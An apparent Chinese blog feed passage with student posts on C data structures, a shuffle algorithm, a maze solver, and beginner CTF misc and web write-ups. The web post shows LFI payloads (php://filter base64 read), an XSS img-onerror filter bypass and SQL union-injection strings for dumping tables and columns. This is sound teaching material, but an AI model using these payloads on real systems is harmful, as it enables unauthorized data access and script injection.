= head;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;m; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next = (linklist)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct node));</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%f%d"</span>, &amp;p-&gt;coef, &amp;p-&gt;expn);</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> <span class="comment">//比较两个指数是否相等</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p &lt; q)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(q == p)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Append</span><span class="params">(linklist p, linklist qa)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;next == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;next = qa;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddPolyn</span><span class="params">(linklist p, linklist q)</span> <span class="comment">//将p+q的值写入p中</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> sum = <span class="number">0</span>;</span><br><span class="line">    linklist ha = p,hb = q,temp = <span class="literal">NULL</span>; <span class="comment">//用来表示头节点或者pa或qa的上一个节点</span></span><br><span class="line">    linklist pa = p-&gt;next; linklist qa = q-&gt;next; <span class="comment">//用pa和qa来遍历链表</span></span><br><span class="line">    <span class="keyword">while</span> (pa &amp;&amp; qa) <span class="comment">//如果pa和qa都不为NULL</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (cmp(pa-&gt;expn, qa-&gt;expn))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">-1</span>:  <span class="comment">//如果p的指数较小</span></span><br><span class="line">                pa = pa-&gt;next;</span><br><span class="line">                ha = ha-&gt;next;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:  <span class="comment">//指数相等</span></span><br><span class="line">                sum = pa-&gt;coef + qa-&gt;coef;</span><br><span class="line">                <span class="keyword">if</span> (sum != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    pa-&gt;coef = sum; <span class="comment">//将系数的和写入p中</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="comment">//如果系数等于0，就释放当前这个节点</span></span><br><span class="line">                &#123;</span><br><span class="line">                    temp = pa-&gt;next; <span class="comment">//用临时变量暂时存储下个节点</span></span><br><span class="line">                    <span class="built_in">free</span>(ha-&gt;next); </span><br><span class="line">                    ha-&gt;next = temp;</span><br><span class="line">                    pa = ha-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">                temp = qa-&gt;next; <span class="comment">//释放q的当前节点，并取下一个节点</span></span><br><span class="line">                <span class="built_in">free</span>(qa);</span><br><span class="line">                qa = temp;</span><br><span class="line">                <span class="keyword">if</span>(pa-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">                    pa = pa-&gt;next; <span class="comment">//如果pa不是最后一个节点则pa移到下一个节点</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:  <span class="comment">//q的指数较小</span></span><br><span class="line">                temp = qa-&gt;next; <span class="comment">//用临时变量存储qa的下一个值    </span></span><br><span class="line">                ha-&gt;next = qa;   <span class="comment">//常见的插入元素操作    </span></span><br><span class="line">                qa-&gt;next = pa;     </span><br><span class="line">                ha = ha-&gt;next;</span><br><span class="line">                qa = temp;  <span class="comment">//让qa继续下一次比较</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (qa != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Append(p, qa);<span class="comment">//将qa剩下的值接到p后面</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(temp);</span><br><span class="line">    <span class="built_in">free</span>(hb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, m;</span><br><span class="line">    linklist p = (linklist)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct node));</span><br><span class="line">    linklist q = (linklist)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct node));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"格式：&lt;系数，指数&gt;\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入第一个多项式的项数："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    CreatPolyn(p, n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入第二个多项式的项数："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;m);</span><br><span class="line">    CreatPolyn(q, m);</span><br><span class="line">    AddPolyn(p, q);</span><br><span class="line">    <span class="comment">//输出结果</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"两个多项式的和为：\n"</span>);</span><br><span class="line">    p = p-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&lt;%f,%d&gt;  "</span>, p-&gt;coef, p-&gt;expn);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我想学数据结构就是去思考，然后多写代码，理解每一句伪代码，并用自己的代码来实现。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近慢慢地在学习算法，数据结构也越来越难理解，正好碰见一道题目来复习单向链表，使用一元多项式表示多项式并求和。&lt;br&gt;对于链表，结构体中得包含指向下一个节点的指针。&lt;br&gt;这道题的重点在于如何去表示多项式，并且如何去比较指数并相加。&lt;br&gt;先定义结构体并将结构体指针化：&lt;b
      
    
    </summary>
    
    
      <category term="算法" scheme="http://zcluslloye.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>misc入门总结</title>
    <link href="http://zcluslloye.cn/2018/03/18/hgame-misc/"/>
    <id>http://zcluslloye.cn/2018/03/18/hgame-misc/</id>
    <published>2018-03-18T07:20:28.000Z</published>
    <updated>2018-03-30T15:12:20.868Z</updated>
    
    <content type="html"><![CDATA[<p>随着hgame线下赛的结束，这一阶段也该告一段落。回想一个多月，既开心又迷茫。平常偶尔打打ctf其实也是蛮开心的，但是当自己面对不会的题目时又十分迷茫(可能这就是咸鱼的痛苦吧)。<br>借此篇文章，也把剩下的自己对于misc的入门知识总结一下。<br><br>misc，在ctf比赛中也称杂项，大多数为取证题和脑洞题。其中取证题也大多需要脑洞，因此最常见的就是取证题。<br>下面我讲讲几类最常见的题型。</p><h1 id="隐写类"><a href="#隐写类" class="headerlink" title="隐写类"></a>隐写类</h1><p>隐写，通常是指在图片，音频，视频，文档中写入隐藏的数据，其中以图片隐写最为常见。</p><h2 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h2><p>最基本的图片隐写：<br><img src="https://miao.su/images/2018/03/18/1808c1.png" alt="1808c1.png"><br>直接在linux下使用binwalk就可以发现一般的隐写数据。<br>还有高级一点的图片隐写：<br><img src="https://miao.su/images/2018/03/18/262d79.png" alt="262d79.png"><br>使用binwalk看不出任何东西，有可能是LSB最低位隐写。<br><img src="https://miao.su/images/2018/03/18/30d7ca.png" alt="30d7ca.png"><br>可以发现压缩包藏在最低位。<br><br>当然还有图片盲水印，一般来说两张图片在一起有可能是盲水印。<br><img src="https://miao.su/images/2018/03/18/4f6a48.png" alt="4f6a48.png"></p><h2 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h2><p>基本的音频隐写和图片类似，把文件拖到binwalk就可以看到信息了。</p><p>音频lsb，和图片lsb类似，使用工具便可以将数据导出。常用的工具有：mp3stego，wavsteg.</p><h1 id="取证类"><a href="#取证类" class="headerlink" title="取证类"></a>取证类</h1><p>通常这类题目是给你一个流量包，让你分析其中和flag有关的信息。<br>最简单的取证题：<br><img src="https://miao.su/images/2018/03/18/5d91ca.png" alt="5d91ca.png"><br>使用wirewhark打开流量包简单查看便可以拿到flag。<br><br>流量包中与隐写，加密相关：<br>这类题目通常让你从流量包中抓住关键数据，保存文件进行分析，取证，例如：<br><img src="https://miao.su/images/2018/03/18/6aae5b.png" alt="6aae5b.png"><br>查看流量包看到一个压缩包和一张图片，随即下载压缩包和图片，发现压缩包加密，但压缩包中有一张同名的图片，随即进行明文攻击。（有空来写写有关压缩包的文章）<br><br><br>当然misc杂项并不止这些，只是现在的我能理解的就只有这么点而已。学习之路漫长而又艰辛，只有不断学习前进才能有所收获。虽然现在不会，但并不代表以后不会，不是吗？<br>因为心中存有信念，便无惧所有的挫折和苦难。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;随着hgame线下赛的结束，这一阶段也该告一段落。回想一个多月，既开心又迷茫。平常偶尔打打ctf其实也是蛮开心的，但是当自己面对不会的题目时又十分迷茫(可能这就是咸鱼的痛苦吧)。&lt;br&gt;借此篇文章，也把剩下的自己对于misc的入门知识总结一下。&lt;br&gt;&lt;br&gt;misc，在c
      
    
    </summary>
    
    
      <category term="misc" scheme="http://zcluslloye.cn/tags/misc/"/>
    
      <category term="CTF" scheme="http://zcluslloye.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>常见的洗牌算法</title>
    <link href="http://zcluslloye.cn/2018/03/14/shuffle/"/>
    <id>http://zcluslloye.cn/2018/03/14/shuffle/</id>
    <published>2018-03-14T12:40:34.000Z</published>
    <updated>2018-04-25T07:45:31.906Z</updated>
    
    <content type="html"><![CDATA[<p>学了半年多编程，多多少少也见过好几种排序方法，选择排序，插入排序，冒泡排序等等。<br>而洗牌算法的目的就是将有序的数组打乱。那么，怎么样洗牌才能使所有可能性概率都是一致的呢？<br>我认为要等概论打乱n张牌，那么就得使某一种打乱的方法出现的可能性为1/n！。<br>那么怎么实现呢？我的第一想法是利用伪随机数来进行打乱。例如，我们要打乱10张牌，那么从第一张牌开始打乱，从1-10的随机数中选取一个数进行交换，以后每个数字都是如此。<br>那么问题来了，这样是等概论吗？这种打乱使已经进行过交换的数字又可能再一次进行交换，导致重复交换，概率肯定是不确定的。<br>既然如此，我们已经可以基本上知道如何使概率为1/n!了。先从最后一个数n开始，选取1-n间的随机数，进行交换；而之后开始打乱第n-1个数，选取1-(n-1)的随机数进行交换。如此反复，便可以得到真正等概率的洗牌算法。</p><h1 id="代码部分"><a href="#代码部分" class="headerlink" title="代码部分"></a>代码部分</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里我们打乱52个数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shuffle</span><span class="params">(<span class="keyword">int</span> *a,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,temp,number;</span><br><span class="line">    srand((<span class="keyword">unsigned</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">for</span>(i = n<span class="number">-1</span> ; i &gt; <span class="number">0</span> ; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        number = rand() % (i+<span class="number">1</span>);</span><br><span class="line">        temp = a[i];</span><br><span class="line">        a[i] = a[number];</span><br><span class="line">        a[number] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">52</span>],i;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="keyword">sizeof</span>(a)/<span class="keyword">sizeof</span>(<span class="keyword">int</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i] = i+<span class="number">1</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    shuffle(a,n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"洗牌后为：\n"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;学了半年多编程，多多少少也见过好几种排序方法，选择排序，插入排序，冒泡排序等等。&lt;br&gt;而洗牌算法的目的就是将有序的数组打乱。那么，怎么样洗牌才能使所有可能性概率都是一致的呢？&lt;br&gt;我认为要等概论打乱n张牌，那么就得使某一种打乱的方法出现的可能性为1/n！。&lt;br&gt;那么怎
      
    
    </summary>
    
    
      <category term="算法" scheme="http://zcluslloye.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>CTF入门(坑)总结——web篇</title>
    <link href="http://zcluslloye.cn/2018/03/12/hgame-web/"/>
    <id>http://zcluslloye.cn/2018/03/12/hgame-web/</id>
    <published>2018-03-12T14:20:28.000Z</published>
    <updated>2018-03-30T15:12:10.129Z</updated>
    
    <content type="html"><![CDATA[<p>为期一个月的hgame寒假训练赛终于结束了。每周都在做题，讲真这么用功学习还真是很少见。当然，一个月时间自己也学到了很多(虽然还是咸鱼)，这里感谢学长们花了很长时间出题目，也感谢几位学长耐心给我解答=。=<br>这篇文章是对寒假学习知识的梳理，也仅代表本咸鱼的观点，如有错误请指出。另外，这边文章也以我在假期写的四篇wp作为参考，链接如下:<br><a href="https://github.com/ZclusLLoye/writeup2018" title="hgame2018_wp" target="_blank" rel="noopener">https://github.com/ZclusLLoye/writeup2018</a><br></p><h1 id="基础总结"><a href="#基础总结" class="headerlink" title="基础总结"></a>基础总结</h1><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>代码审计通常不会单独成题目，而是结合web漏洞来成题，例如：<br><img src="https://s1.ax2x.com/2018/03/12/EicaY.png" alt="EicaY.png"><br><br>你首先需要审计代码才能知道该如何绕过限制(当然这段代码有点短)，先是知道pattern是什么，然后了解json怎么绕过。所以说代码审计在比赛中绝对是基础中的基础，对此你需要了解相应的语言。</p><h2 id="请求头的查看与修改"><a href="#请求头的查看与修改" class="headerlink" title="请求头的查看与修改"></a>请求头的查看与修改</h2><p>请求头在web中是最常见的东西，相应的请求头中的信息我们更需要加以利用。例如：</p><p><img src="https://miao.su/images/2018/03/12/22a649.png" alt="22a649.png"><br><img src="https://miao.su/images/2018/03/12/3447c3.png" alt="3447c3.png"><br>通过修改请求头来达到我们的目的。至于如何修改，之后说。</p><h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><p>工具的使用那就很多了。常见的web工具有burpsuite(一款强大的网络工具)，sqlmap(sql漏洞检查工具)等等，具体可以网上找找相应的ctf工具合集。这里我们可以用burpsuite来进行抓包改包重发包。<br><img src="https://miao.su/images/2018/03/12/46e1d1.png" alt="46e1d1.png"><br>类似的工具还有很多，需要自己慢慢去摸索。</p><h2 id="脚本书写"><a href="#脚本书写" class="headerlink" title="脚本书写"></a>脚本书写</h2><p>脚本的书写通常是在工具已经无法满足我们要求时，我们需要自己书写脚本来实现某种特定的要求。这里我推荐的脚本语言为python，毕竟人生苦短，我用python。=。=假期的时候自己也写过一些脚本。这里就不贴出来了。</p><p>综上，想打ctf，基础知识和工具使用一定必不可少。下面讲讲新手会碰到的常见漏洞。</p><h1 id="常见漏洞梳理"><a href="#常见漏洞梳理" class="headerlink" title="常见漏洞梳理"></a>常见漏洞梳理</h1><h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p>PHP当中有许多的常见的漏洞，其中最常见的就是文件包含漏洞。在假期的学习中，遇见的两题常见的文件包含漏洞。<br><br>1.直接通过修改文件路径来获得文件内容。<br><img src="https://miao.su/images/2018/03/13/582864.png" alt="582864.png"><br>我们发现url后带有文件路径，随即修改路径为flag.php查看response即可拿到flag。<br><br>2.通过php伪协议来读取文件。那么什么是php伪协议？php中支持的伪协议有以下几种：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP网址</span><br><span class="line">ftp:// — 访问 FTP</span><br><span class="line">php:// — 访问各个输入/输出流</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect://处理交互式的流</span><br></pre></td></tr></table></figure><br>这里我们重点要说的就是php://<br>先给出官方文档<br><a href="http://php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.php.php</a> <br><br>之后我会写一篇详细的文章讲讲我对php://伪协议的理解，这里便不再多讲。<br>回到题目，有时候我们无法通过直接输入文件名来获取文件，便需要使用php伪协议来把文件的base64编码后的内容读出，从而获得flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//我们常用的php任意文件读取payload</span><br><span class="line">php://filter/read=convert.base64-encode/resource=upload.php</span><br></pre></td></tr></table></figure><br>这里使用的过滤器为convert.base64-encode，字面上就可以知道是把读取的内容encode成base64编码。过滤器的问题，我一起留到后面的文章。<br><img src="https://miao.su/images/2018/03/13/66f1c0.png" alt="66f1c0.png"><br>以上就是常见的两种LFI漏洞的利用。                                                                                    </p><h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>xss，全程为Cross Site Scripting，也称跨站脚本攻击。攻击者通过在web页面中插入恶意的script代码，当有用户访问这个页面时，该用户就会受到攻击。xss分为存储型和反射型。反射型xss，是非持久的，只有用户自己点击链接才会触发。而存储型xss，是攻击者插入到服务器的恶意代码，例如博客文章等地方。这种xss通常比较危险。<br><br>要理解xss，就必须理解html语言。<br>例如：<br><img src="https://miao.su/images/2018/03/15/9b55b3.png" alt="9b55b3.png"><br>出题者已经给出了关键代码。那么我们怎么去插入一段代码让网页弹窗出现数字1呢？<br>我们知道代码过滤了script，image还有左括号，由于img标签没有被过滤，我们就可以通过img标签的onerror来执行恶意代码。构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&apos;&apos; onerror=alert&amp;#40;1)&gt;</span><br></pre></td></tr></table></figure><br>如此，便完成一次了xss攻击，事实上，攻击者通常将alert(1)换成其他恶意的代码来进行攻击，例如盗取cookie等等。</p><h2 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h2><p>sqli，通常意义上指数据库注入。攻击者通过对参数的修改来达到访问数据库的目的。<br>例如有以下的php语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$user = $_GET[&apos;user&apos;];</span><br><span class="line">$query=&quot;select * from users where username=&apos;&quot;.$user.&quot;&apos;&quot;;</span><br></pre></td></tr></table></figure><br>由于没有任何过滤，攻击者可以通过修改user的值来对数据库进行访问。例如攻击者使username=’ and 1=1<br><br>那么后台的sql查询语句就变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&apos;&apos; and 1=1;</span><br></pre></td></tr></table></figure><br>由于1=1为永真式，那么这条语句就会列出user表中的所有数据。这必定造成极大的危害。<br><br>sql注入通常有两类，有回显的注入和无回显的注入。有回显的注入又分为带有数据的回显型注入，基于布尔的注入，还有基于报错的注入等等。无回显的注入，一般有基于时间延迟的注入。<br><br>一般新手使用的是sql注入自动化工具——sqlmap，一个可以自动判断类型和自动注入的python脚本。但我还是希望每位初学者可以少用或者不用这些脚本，如果连原理都不明白，那也只是单纯的一个脚本小子而已。当你明白原理，知道怎么做之后，那用用别人的脚本确实是没什么的。<br><br>这些注入整理我也会在以后的学习和比赛中慢慢积累和学习，这里便不在多讲。<br><br>下面以一道例题结束这篇文章。<br><img src="https://miao.su/images/2018/03/13/7b32de.png" alt="7b32de.png"><br>我们发现一个网站存在注入，并且后端自动帮你把单引号加上了。<br>所以我们就可以进行爆库，也称脱库。<br><img src="https://miao.su/images/2018/03/13/8b629c.png" alt="8b629c.png"><br>这里先爆数据库的名称。一般来说sql注入题最后都有一个闭合符合#，但这题自动帮你加上了。(毕竟是新手题)<br>然后就是一爆到底了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//爆表名</span><br><span class="line">id=1 union select 1,table_name from information_schema.tables where table_schema=database()</span><br><span class="line">//列名</span><br><span class="line">id=1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;xxxx&apos; //xxx是表的名称</span><br><span class="line">//字段名</span><br><span class="line">id=1 union select 1,yyy from xxx //xxx为表名，yyy为列名</span><br><span class="line"></span><br><span class="line">//提示：由于UNION 内部的每个 SELECT 语句必须拥有相同数量的列，所以union select 后有两个参数。</span><br></pre></td></tr></table></figure><br>这就是sql的新手入门题了。<br></p><p>这篇文章讲的不是很多，但算是我假期间对web知识的再学习和补充。下次我将讲讲我对ctf中misc杂项的入门总结。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;为期一个月的hgame寒假训练赛终于结束了。每周都在做题，讲真这么用功学习还真是很少见。当然，一个月时间自己也学到了很多(虽然还是咸鱼)，这里感谢学长们花了很长时间出题目，也感谢几位学长耐心给我解答=。=&lt;br&gt;这篇文章是对寒假学习知识的梳理，也仅代表本咸鱼的观点，如有错误
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://zcluslloye.cn/tags/CTF/"/>
    
      <category term="web" scheme="http://zcluslloye.cn/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>使用递归算法解决迷宫问题</title>
    <link href="http://zcluslloye.cn/2018/03/10/maze/"/>
    <id>http://zcluslloye.cn/2018/03/10/maze/</id>
    <published>2018-03-10T14:20:28.000Z</published>
    <updated>2018-03-30T15:02:52.051Z</updated>
    
    <content type="html"><![CDATA[<p>最近看递归的问题有点多，也逐渐有了自己的想法和思路。对于递归问题，其实让人不理解的无非是它的逻辑思路，遇到不理解的地方在纸上写写逻辑，问题就迎刃而解了。</p><h1 id="代码部分"><a href="#代码部分" class="headerlink" title="代码部分"></a>代码部分</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> startX 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> startY 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endX 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endY 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//由于遍历的不同导致迷宫走法不唯一 </span></span><br><span class="line"><span class="comment">//这里采用下上左右的顺序来走迷宫 </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">TraceRoute</span><span class="params">(<span class="keyword">int</span> a[<span class="number">10</span>][<span class="number">10</span>],<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> end = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//用2标记走过的地方</span></span><br><span class="line">    a[i][j]=<span class="number">2</span>;</span><br><span class="line">    <span class="comment">//end=1表示到达终点</span></span><br><span class="line">    <span class="keyword">if</span>(i == endX&amp;&amp;j == endY)</span><br><span class="line">        end = <span class="number">1</span>; </span><br><span class="line">    <span class="comment">//开始走迷宫，4种走法 </span></span><br><span class="line">    <span class="comment">//下 </span></span><br><span class="line">    <span class="keyword">if</span>(end != <span class="number">1</span> &amp;&amp; i + <span class="number">1</span> &lt;= endX &amp;&amp; a[i+<span class="number">1</span>][j] == <span class="number">1</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(TraceRoute(a,i+<span class="number">1</span>,j) == <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">//函数返回1后层层递归 </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//上 </span></span><br><span class="line">    <span class="keyword">if</span>(end != <span class="number">1</span> &amp;&amp; i - <span 